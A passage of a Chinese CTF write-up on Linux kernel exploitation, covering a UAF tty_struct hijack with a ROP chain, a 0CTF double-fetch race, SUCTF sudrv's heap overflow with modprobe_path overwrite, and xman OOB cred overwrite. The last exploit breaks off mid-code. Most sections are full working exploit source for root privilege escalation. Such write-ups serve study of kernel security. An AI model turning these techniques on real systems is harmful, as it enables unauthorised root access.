    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;      /* protects tty_files list */
    struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

思路是利用UAF泄露出部分tty_struct结构体的内容，我们把operation这个结构体指针改成我们伪造的函数结构体指针，在函数结构体指针中按照顺序改三个指针为gadgets和rop，最终在调用write的时候触发这些函数执行劫持控制流，rop之后先改rc4，后面都一样。

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t user_cs,user_ss,user_rflags,user_sp;

size_t prepare_kernel_cred = 0xffffffff810a1810;
size_t commit_creds = 0xffffffff810a1420;

size_t vmlinux_base;

void save_status()
{
  __asm__(
    "mov user_cs,cs;"
    "mov user_ss,ss;"
    "mov user_sp,rsp;"
    "pushf;"
    "pop user_rflags;"
  );
  puts("[*] status has been saved.");

}

void BeRoot()
{
    char* (*fun1)(int) = prepare_kernel_cred;
    void  (*fun2)(char*) = commit_creds;
    (*fun2)((*fun1)(0));
}

void GetRootShell()
{
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[*] get root shell error!");
    }
}

size_t FindVmlinuxBase()
{
    int fd = fopen("/tmp/kallsyms","r");
    if(fd == -1){
        puts("[*]open symbol file failed.");
    }
    char buf[0x30] = {0};
    while(fgets(buf,0x30,fd)){
        if(commit_creds && prepare_kernel_cred)
            return 0;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
    }
}

size_t raw_vmlinux_base = 0xffffffff81000000;

int main()
{
    save_status();
    //FindVmlinuxBase();

    printf("[*]prepare_kernel_cred addr:%p\n",prepare_kernel_cred);
    printf("[*]commit_creds addr:%p\n",commit_creds);
    //rops
    size_t rop[0x20];
    int i = 0;
    rop[i++] = 0xffffffff810d238d;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;
    rop[i++] = 0;
    rop[i++] = (size_t)BeRoot;
    rop[i++] = 0xffffffff81063694;
    rop[i++] = 0;
    rop[i++] = 0xffffffff814e35ef;
    rop[i++] = (size_t)GetRootShell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    //fake tty operations
    void* fake_ops[32];

    //UAF to leak the initial tty_struct
    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);
    ioctl(fd1,0x10001,0x2e0);
    close(fd1);
    //now we have a UAF :)
    int tty_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);//use the former released one
    size_t fake_tty_struct[4] = {0};
    read(fd2,fake_tty_struct,0x20);
    fake_tty_struct[3] = (size_t)fake_ops;
    for(int j=0; j < 30;j++)
        fake_ops[j] = 0xFFFFFFFF8181BFC5;
    fake_ops[0] = 0xffffffff810635f5;//lookup func
    fake_ops[1] = (size_t)rop;//install 
    fake_ops[3] = 0xFFFFFFFF8181BFC5;//open
    write(fd2,fake_tty_struct,0x20);//write back
    char buf[8] ={0};
    write(tty_fd,buf,8);
    return 0;
}
```

## Double Fetch

### 简介

Double Fetch是一种类似条件竞争的攻击方式，原理是内核在调用用户空间数据的时候可能会先做安全检查，随后调用其数据指针，而第二次取数据处理的时候可能使用被篡改的恶意数据。

### 2018 0CTF Finals Baby Kernel

#### 漏洞分析

flag是编码到bss上的，我们要做的是通过一些校验，即可得到输出的flag。

ioctl主要有两个功能,cmd=0x6666的时候输出flag的地址到dmesg里，cmd=0x1337的时候开始进行校验。检查的内容是指针是否是用户态空间数据，指针内部的flag_str指针是否是用户态数据，非用户态的话会直接返回，第三个检查是flag_str的长度是否和flag长度一致，我们这里利用double fetch的漏洞，先从dmesg里得到flag的地址，之后构造恶意线程不断往用户态的一个数据指针里修改flag_str为内核flag地址，这样在经过三次校验之后有一定几率在校验flag字节前把flag_str改为实际flag地址，之后即可输出flag。

```c
signed __int64 __fastcall baby_ioctl(__int64 a1, __int64 arg1)
{
  __int64 arg2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  __int64 arg22; // [rsp-58h] [rbp-58h]

  _fentry__(a1, arg1);
  arg22 = arg2;
  if ( (_DWORD)arg1 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( (_DWORD)arg1 == 0x1337
         && !_chk_range_not_ok(arg2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 0x1358))
         && !_chk_range_not_ok(
               *(_QWORD *)arg22,
               *(signed int *)(arg22 + 8),
               *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 0x1358))
         && *(_DWORD *)(arg22 + 8) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(*(_QWORD *)arg22 + i) != flag[i] )
        return 22LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 14LL;
  }
  return result;
}
```

#### exp.c

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define LEN 0x1000

struct attr{
    char* flag;
    size_t len;
};

int is_finished = 0;
char buf[LEN+1] = {0};
unsigned long long flag_addr;

void change_attr(void* s){
    struct attr* s1 = s;
    while(!is_finished)
        s1->flag = flag_addr;
}

int main()
{
    //leak flag address from dmesg
    int fd = open("/dev/baby",0);
    ioctl(fd,0x6666);
    //
    system("dmesg > /tmp/record.txt");
    int dmesg_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(dmesg_fd,-0x1000,SEEK_END);
    read(dmesg_fd,buf,LEN);
    close(dmesg_fd);
    char* pos = strstr(buf,"Your flag is at ");
    if(pos == NULL)
        printf("Not found\n");
    else
        pos += 0x10;
    flag_addr = strtoull(pos,pos+0x10,0x10);
    printf("[*]flag addr:%p",flag_addr);
    //create threads
    struct attr t;
    t.flag = buf;
    t.len = 33;
    pthread_t t1;
    pthread_create(&t1,NULL,change_attr,&t);
    for(int i = 0;i < 0x1000;i++){
        ioctl(fd,0x1337,&t);
        t.flag = buf;
    }
    is_finished = 1;
    pthread_join(t1,NULL);
    close(fd);
    puts("[*]result:\n");
    system("dmesg | grep flag");
    return 0;
}
```

## Heap Overflow

### 简介

之前介绍的大部分都是栈的内容，内核堆漏洞也是蛮多的，最简单的莫过于堆溢出，因为slab的分配类似fastbin，我们可以通过溢出覆盖下一个free_chunk的fd两次分配到任意地址。

### SUCTF 2019 sudrv

#### 漏洞利用

ioctl给了仨功能，分别是分配、释放和输出堆块内容，其中`sudrv_ioctl_cold_2`函数有格式化字符串漏洞，可以通过`%llx`泄露栈上的内容，进而从dmesg里获取泄露的函数相关地址以及栈地址，通过堆溢出(write未检查buf和size)我们可以分配到堆到栈上进行溢出写`rop`。

除此之外，我们还可以通过劫持`modprobe_path`不起root shell但是可以以root身份执行任意命令，比如把flag拷贝到/tmp目录下并给777权限之后查看。这个原理是内核在运行异常的时候会调用modprobe_path指向的文件，我们改成自己编写的getflag.sh即可，执行完exp之后手动取执行/tmp/ll(一个格式错误的可执行文件)即可触发读取flag。




```c
__int64 __fastcall sudrv_ioctl(__int64 a1, int cmd, __int64 arg2)
{
  __int64 result; // rax

  switch ( cmd )
  {
    case 0x73311337:
      if ( (unsigned __int64)(arg2 - 1) > 0xFFE )
        return 0LL;
      su_buf = (char *)_kmalloc(arg2, 0x480020LL);// add
      result = 0LL;
      break;
    case (int)0xDEADBEEF:
      JUMPOUT(su_buf, 0LL, sudrv_ioctl_cold_2); // format string leak address
      result = 0LL;
      break;
    case 0x13377331:
      kfree(su_buf);
      result = 0LL;
      su_buf = 0LL;
      break;
    default:
      return 0LL;
  }
  return result;
}

void __fastcall sudrv_ioctl_cold_2(__int64 a1, __int64 a2)
{
  printk(a1);
  JUMPOUT(&loc_38);
}


```
注意在这里的modprobe_path在/proc/kallsyms里没有符号，我们可以通过引用找到它[参考](https://www.anquanke.com/post/id/185911#h3-2)，先找到`__request_module`函数，在gdb里查看函数汇编即可找到`modprobe_path`。在这里未开kalsr的时候是`0xffffffff82242320`
```
/ # cat /proc/kallsyms | grep __request
ffffffff81065210 t __request_resource
ffffffff81065d60 T __request_region
ffffffff810833e0 T __request_module
ffffffff8108378b t __request_module.cold.4
ffffffff810b2c10 T __request_percpu_irq

gdb-peda$ x/28i 0xffffffff810833e0                                
   0xffffffff810833e0:  push   rbp
   0xffffffff810833e1:  mov    rbp,rsp
   0xffffffff810833e4:  push   r15
   0xffffffff810833e6:  push   r14
   0xffffffff810833e8:  push   r13
   0xffffffff810833ea:  mov    r13,rsi
   0xffffffff810833ed:  push   r12
   0xffffffff810833ef:  movzx  r12d,dil
   0xffffffff810833f3:  push   r10
   0xffffffff810833f5:  lea    r10,[rbp+0x10]
   0xffffffff810833f9:  push   rbx
   0xffffffff810833fa:  mov    ebx,edi
   0xffffffff810833fc:  sub    rsp,0xb8
   0xffffffff81083403:  mov    QWORD PTR [rbp-0x50],rdx
   0xffffffff81083407:  mov    QWORD PTR [rbp-0x48],rcx
   0xffffffff8108340b:  mov    QWORD PTR [rbp-0x40],r8
   0xffffffff8108340f:  mov    QWORD PTR [rbp-0x38],r9
   0xffffffff81083413:  mov    rax,QWORD PTR gs:0x28
   0xffffffff8108341c:  mov    QWORD PTR [rbp-0x68],rax
   0xffffffff81083420:  xor    eax,eax
   0xffffffff81083422:  test   dil,dil
   0xffffffff81083425:  jne    0xffffffff810835a6
   0xffffffff8108342b:  xor    r15d,r15d
   0xffffffff8108342e:  cmp    BYTE PTR [rip+0x11beeeb],0x0        # 0xffffffff82242320
   0xffffffff81083435:  jne    0xffffffff8108345e
   0xffffffff81083437:  mov    rcx,QWORD PTR [rbp-0x68]
   0xffffffff8108343b:  xor    rcx,QWORD PTR gs:0x28
   0xffffffff81083444:  mov    eax,r15d
gdb-peda$ x/s 0xffffffff82242320
0xffffffff82242320:     "/tmp/getflag.sh"

```

#### exp.c

exp来自17学长，在测试这个`fastbin`分配机制的时候我试了下改size，0x700、0x600和0x900均不行，最后是0x800和0x400成功，挠头.jpg，找了下也没有讲的很好的slab/slub分配机制的文章，回头再说好了。

使用的时候使用管道作为输入`printf '\x20\x23\x24\x82\xff\xff\xff\xff' | ./exp`，执行完exp之后执行/tmp/ll再`cat /tmp/flag`即可。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#define CREATE 0x73311337
#define SHOW 0xDEADBEEF
#define DELETE 0x13377331


void create_slab(int fd, unsigned long long size) {
    ioctl(fd, CREATE, size);
}

void show(int fd) {
    ioctl(fd, SHOW, NULL);
}

void delete(int fd){
    ioctl(fd, DELETE, NULL);
}

int main(void) {
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    int fd = open("/dev/meizijiutql", O_RDWR);
    char *buf = malloc(0x1000);

    memset(buf, 'a', 0x1000);

    create_slab(fd, 0x80);

    write(fd, buf, 0x60);

    show(fd);
    show(fd);
    show(fd);
    show(fd);
    //getchar();

    char *modprobe_addr = (char *)malloc(0x10);

    create_slab(fd, 0x400);

    memset(modprobe_addr, '\x00', 0x10);
    memset(buf, '\x00', 0x1000);
    memset(buf, 'a', 0x400);

    printf("Please input modprobe_addr:");

    read(0, modprobe_addr, 8);

    strcat(buf, modprobe_addr);

    write(fd, buf, 0x408);

    create_slab(fd, 0x400);
    write(fd, "/tmp/getflag.sh\x00", 17);
    create_slab(fd, 0x400);
    write(fd, "/tmp/getflag.sh\x00", 17);

    close(fd);
    return 0;
}

```

## prctl爆破cred地址

### 简介

是p4nda师傅介绍的三种[权限提升思路](http://p4nda.top/2018/11/07/stringipc/#EXP)，第一种也是最简单的思路就是直接修改cred结构体对应标识权限的数据为0，这里用到了一个leak cred地址的方式，首先我们要知道一些基础知识。每个线程在内核中都对应一个线程栈，一个thread_info结构体，这个结构体如下：
```c
struct thread_info {
	struct task_struct	*task;		/* main task structure */
	__u32			flags;		/* low level flags */
	__u32			status;		/* thread synchronous flags */
	__u32			cpu;		/* current CPU */
	mm_segment_t		addr_limit;
	unsigned int		sig_on_uaccess_error:1;
	unsigned int		uaccess_err:1;	/* uaccess failed */
};
```

在这个结构体中cred结构体用以标识线程的权限，在cred结构体后8字节的位置有一个字符数组`char comm[TASK_COMM_LEN];`用来表示进程名(`不超过16字节`)，我们可以用`prctl`设置它的内容之后用任意读穷举搜索其位置，进而定位到cred地址，之后结合任意写改其内容即可。

```c
struct task_struct {
	volatile long state;	/* -1 unrunnable, 0 runnable, >0 stopped */
	void *stack;
	atomic_t usage;
	unsigned int flags;	/* per process flags, defined below */
	unsigned int ptrace;
... ...

/* process credentials */
	const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
	const struct cred __rcu *real_cred; /* objective and real subjective task
					 * credentials (COW) */
	const struct cred __rcu *cred;	/* effective (overridable) subjective task
					 * credentials (COW) */
	char comm[TASK_COMM_LEN]; /* executable name excluding path
				     - access with [gs]et_task_comm (which lock
				       it with task_lock())
				     - initialized normally by setup_new_exec */
/* file system info */
	struct nameidata *nameidata;
#ifdef CONFIG_SYSVIPC
/* ipc stuff */
	struct sysv_sem sysvsem;
	struct sysv_shm sysvshm;
#endif
... ... 
};

struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

### xman结营赛 OOB

#### 程序分析

这个题坑还挺多的(还是我太菜了)，启动脚本去掉定时关机，去掉aslr方便调试。

```sh
#!/bin/sh
#echo "[+]starting qemu-"
qemu-system-x86_64 \
    -m 512M \
    -nographic \
    -kernel ./bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -smp cores=2,threads=4 \
    -cpu qemu64,smep,smap 2>/dev/null \
    -s
#echo "[-]boot end"
```
新建一个文件夹把cpio拷进去，执行`cpio -dmv < rootfs.cpio`解压出文件系统，到./etc/init.d里去改rcS(这里的init脚本为空)，初始脚本里没有挂载`/sys`目录导致我们没法看更多信息(lsmod可以查看模块.text的加载基址)，可以先拿root起，方便看函数地址等。

```sh
#!/bin/sh

mount -t proc none /proc
mount -t devtmpfs none /dev
mount -t sysfs none /sys
mkdir /dev/pts
mount /dev/pts

insmod /home/pwn/OOB.ko
chmod 644 /dev/OOB
chmod -R 777 /sys/
echo 0 > /proc/sys/kernel/dmesg_restrict
echo 0 > /proc/sys/kernel/kptr_restrict

cd /home/pwn
chown -R root /flag
chmod 400 /flag


chown -R 1000:1000 .
#chown -R 0:0 .
setsid cttyhack setuidgid 1000 sh

umount /proc
#poweroff -f
```

另外进去之后看一眼/dev/OOB的权限会发现普通用户是只读的，我平时`open`的时候参数习惯为`2`表示可读写，现在普通用户只能为`0`，否则文件打开会失败。

OOB.ko里其实只有一个`ioctl`，里面有四个命令，分别对应`Malloc`、`Free`、`Write`和`Read`，仔细观察一下我们可以控制`idx`、`user_buf`、`stack_size`和`stack_idx`而在R/W的时候没有对`idx`进行检查，虽然他是一个unsigned int的类型，但是我们可以往前任意读，我们Malloc的对象是一个0x100大小的对象，其地址作为obj的addr和0x100存储在bss上，如果bss_list高地址有一些数据满足条件我们就可以任意读了(`stack_idx + stack_size <= obj_idx1->size`)这里的stack_idx可以看成addr的offset(单字节)，stack_size为我们想读取的数据大小，其相加小于`size`，因为我们不能事先在bss上写东西，因此只能往前找满足条件的fake_obj。

```c

/*
00000000 object          struc ; (sizeof=0x10, align=0x8, copyof_484)
00000000                                         ; XREF: .bss:pool/r
00000000 addr            dq ?                    ; XREF: oob_ioctl+5F/r
00000000                                         ; oob_ioctl+110/r ... ; offset
00000008 size            dq ?
00000010 object          ends
*/

signed __int64 __fastcall oob_ioctl(__int64 arg1, unsigned int arg2, __int64 arg3)
{
  unsigned int arg22; // ebx
  __int64 arg33; // rsi
  __int64 idx1; // rax
  char *obj_idx1_addr; // rsi
  object *obj_idx1; // rax
  __int64 v9; // r13
  object *obj_idx; // rbx
  bool obj_addr; // zf
  void *alloc_addr; // rax
  __int64 v13; // r12
  __int64 idx2; // rax
  __int64 addr_idx2; // rdi
  object *v16; // rax
  __int64 idx3; // rbx
  void *v18; // rdi
  object *v19; // rbx
  unsigned int idx; // [rsp+0h] [rbp-38h]
  __int64 user_buf; // [rsp+8h] [rbp-30h]
  __int64 stack_size; // [rsp+10h] [rbp-28h]
  __int64 stack_idx; // [rsp+18h] [rbp-20h]

  arg22 = arg2;
  arg33 = arg3;
  copy_from_user(&idx, arg3, 0x20LL);           // idx可控
  if ( arg22 != 0x30001 )
  {
    if ( arg22 <= 0x30001 )
    {
      if ( arg22 == 0x30000 )                   // 0x30000->malloc
      {
        v9 = user_buf;
        JUMPOUT(*(&obj_num + 0x40000000), 9, oob_ioctl_cold_0);// obj_num大于9跳转
        obj_idx = &pool[idx];                   // no check 
        obj_addr = obj_idx->addr == 0LL;
        obj_idx->size = 0x100LL;
        if ( obj_addr )
        {
          alloc_addr = (void *)kmem_cache_alloc(kmalloc_caches[8], 0x6000C0LL);// malloc 0x100
          if ( (unsigned __int64)alloc_addr > 0xF )
          {
            obj_idx->addr = alloc_addr;
            v13 = 0LL;
            copy_from_user(alloc_addr, v9, 0x100LL);// copy stack addr to heap
            return v13;
          }
        }
      }
    }
    else
    {
      if ( arg22 != 0x30002 )
      {
        if ( arg22 == 0x30003 )                 // 0x30003
        {
          idx1 = idx;
          obj_idx1_addr = (char *)pool[idx1].addr;
          obj_idx1 = &pool[idx1];               // idx1无检查
          if ( obj_idx1_addr )
          {
            if ( stack_idx + stack_size <= obj_idx1->size )
            {
              copy_to_user(user_buf, &obj_idx1_addr[stack_idx], stack_size);// arbRead
              return 0LL;
            }
          }
        }
        return -1LL;
      }
      idx2 = idx;                               // 0x30002
      addr_idx2 = (__int64)pool[idx2].addr;
      v16 = &pool[idx2];
      if ( addr_idx2 && stack_idx + stack_size <= v16->size )
      {
        copy_from_user(stack_idx + addr_idx2, user_buf, stack_size);// arbWrite
        return 0LL;
      }
    }
    return -1LL;
  }
  idx3 = idx;                                   // 0x30001->free
  v18 = pool[idx3].addr;
  v19 = &pool[idx3];
  if ( !v18 )
    return -1LL;
  kfree(v18, arg33);
  v19->addr = 0LL;
  return 0LL;
}
```

一番努力之后终于找到了满足条件的地方，bss_list地址为`0xffffffffa0002420`，用这个obj我们可以读取`[0x000d00620000002e,0x000d00620000002e+0xffffffffa0002420)`范围内的地址的值

```
0xffffffffa0003090:     0x000d00620000002e     0xffffffffa0002420
0xffffffffa00030a0:     0x0000000000000500      0x000b006400000033
```

显然`bss_list`是满足这个条件的

![alloc](./1.png)

尝试多次分配，发现分配12次之后之前的slub缓存就用完了，会用Buddy分配新的一块区域供继续分配，至此我们的思路就有了，分配完这些内存然后`fork`一个进程，触发创建新的`cred`对象，这个对象地址一定在`0x*17df00`和`0x*1e3f100`之间，我们就可以爆破这块内存区域，寻找我们prctl设置的进程名，进而搜到cred。

下一步用任意地址读读取cred里前0x100的内容，修改前0x28字节为usr_buf。再用任意地址写写到free后的slab的fd，两次Malloc可以得到cred对象，把usr_buf拷贝进去后即可提权成功。

![root](./2.png)

#### exp.c

这里还有地方是我没想明白的，就是我以为自己修改的cred是子进程里的，没想到就是本进程的，之前一直在子进程起shell，卡了很久

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/auxv.h> 
#include <sys/ioctl.h> 


#define MallocCmd  0x30000
#define FreeCmd    0x30001
#define WriteCmd   0x30002
#define ReadCmd    0x30003

#define BUFSZ   0x100

char usr_buf[BUFSZ];

typedef struct attr
{
    size_t addr;
    size_t size;
} Attr;

void Malloc(int fd,unsigned int idx,char* ini_buf)
{
    size_t input[4];
    input[0] = idx;
    input[1] = (size_t)ini_buf;
    ioctl(fd,MallocCmd,input);
    return;
}

void Malloc1(int fd,unsigned int idx,size_t* ini_buf)
{
    size_t input[4];
    input[0] = idx;
    input[1] = (size_t)ini_buf;
    ioctl(fd,MallocCmd,input);
    return;
}

void Free(int fd,unsigned int idx)
{
    size_t input[4];
    input[0] = idx;
    ioctl(fd,FreeCmd,input);
    return;
}

void Read(int fd,size_t obj_idx,size_t addr_idx,size_t size)
{
    size_t input[4];
    input[0] = obj_idx;
    input[1] = (size_t)usr_buf;
    input[2] = size;
    input[3] = addr_idx;
    ioctl(fd,ReadCmd,input);
}

void Write(int fd,size_t obj_idx,size_t addr_idx,size_t size)
{
    size_t input[4];
    input[0] = obj_idx;
    input[1] = (size_t)usr_buf;
    input[2] = size;
    input[3] = addr_idx;
    ioctl(fd,WriteCmd,input);
}

void LongToStr(unsigned long long addr)
{
    unsigned long long high_4 = addr >> 32;
    unsigned long long low_4 = addr & 0xffffffff;
    usr_buf[0] = low_4 & 0xff;
    usr_buf[1] = (low_4 & 0xffff) >> 8;
    usr_buf[2] = (low_4 >> 16) & 0xff;
    usr_buf[3] = (low_4 >> 16) >> 8;
    usr_buf[4] = (high_4 & 0xff);
    usr_buf[5] = (high_4 & 0xffff) >> 8;
    usr_buf[6] = (high_4 >> 16) & 0xff;
    usr_buf[7] = (high_4 >> 16) >> 8;
    usr_buf[8] = 0;
    usr_buf[9] = 0x10;
}


int main()
{
    char hidden_str[0x10];
    strncpy(hidden_str,"ama2in9PwnForMe\x00",0x10);
    prctl(PR_SET_NAME,hidden_str);
    int fd = open("/dev/OOB",0);
    if(fd == -1)
        printf("[-]open failed!\n");
    char ini_buf[0x100] = {0};
    Malloc(fd,0,ini_buf);
    //Read(fd,0,0x20,0xe0);
    //leak heap
    memset(usr_buf,'\x00',BUFSZ);
    Read(fd,0xc7,0xfff2ff9da00023f2L,0x8);
    char* ptr;
    unsigned long long heap_base = 0;
    char hex[0x10];
    strncpy(hex,usr_buf,0x2);
    printf("[*]hex:%x\n",hex[1]);

    //heap_base1 = strtoull(usr_buf,usr_buf+0x10,0x10);
    int count = 0;
    for(int i = 0;i<8;i++)
        if(usr_buf[i] != '\x00')
            count += 1;
    printf("total count:%d\n",count);
    for(int i = 0; i < 8;i++){
        unsigned long long tmp;
        sscanf(&usr_buf[i],"%c",&tmp);
        tmp = tmp & 0xff;
        printf("[*]char:%x\n",usr_buf[i]);
        if(strlen(&usr_buf[i]) == 0)
            tmp = 0;
        printf("[*]tmp:%x\n",tmp);
        heap_base += (tmp << (8*i));
    }
    printf("[*]leak heap success:0x%llx\n",heap_base);
    for(int i = 0;i < 0x10-4;i++)
        Malloc(fd,i,ini_buf);
    //for(int i = 0;i < 0x10-4;i++)
    //    Free(fd,i);
    int pid = fork();
    if(pid == 0){
        //sub processs
        char hidden_str1[0x10];
        strncpy(hidden_str1,"ama2in9PwnForFun",0x10);
        prctl(PR_SET_NAME,hidden_str1);
        while(getuid()){
            printf("[-] not yet\n");
            sleep(2);
        }
        printf("[*]root");
        system("cat /flag");
    }
    //fuck 
    unsigned long long start_addr = heap_base;
    //unsigned long long start_addr = heap_base & 0xfffffff000000000;
    unsigned long long end_addr = heap_base + (0xffff88801e3de000-0xffff88800017d400);
    //unsigned long long end_addr = 0xffffc80000000000;
    printf("[*]fuck start addr:0x%llx\n",start_addr);
    printf("[*]fuck end addr:0x%llx\n",end_addr);
    size_t off_idx = (start_addr-0xffffffffa0002420) / 0x10;
    printf("[*]fuck idx:0x%llx\n",off_idx);
    printf("[*]finding str:%s\n",hidden_str);
    unsigned long long result = 0;
    size_t cred = 0;
    size_t real_cred = 0;
    size_t target_addr = 0;
